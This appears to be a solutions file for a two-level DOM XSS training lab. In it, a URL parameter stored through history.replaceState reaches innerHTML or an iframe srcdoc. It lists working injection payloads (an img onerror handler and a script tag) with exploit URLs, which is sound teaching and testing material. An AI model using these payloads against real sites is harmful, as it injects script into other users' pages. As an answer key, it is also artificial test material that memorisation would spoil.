# history-state — solutions

DOM sinks where `?seed` is stored via `history.replaceState` and then read back into `innerHTML` / `srcdoc`.

### history-state-level1

`/history-state/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `history.state` written into `innerHTML`; `<script>` won't fire via innerHTML so use img/onerror

### history-state-level2

`/history-state/level2/?seed=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: state.html written into iframe `srcdoc`; scripts execute inside srcdoc
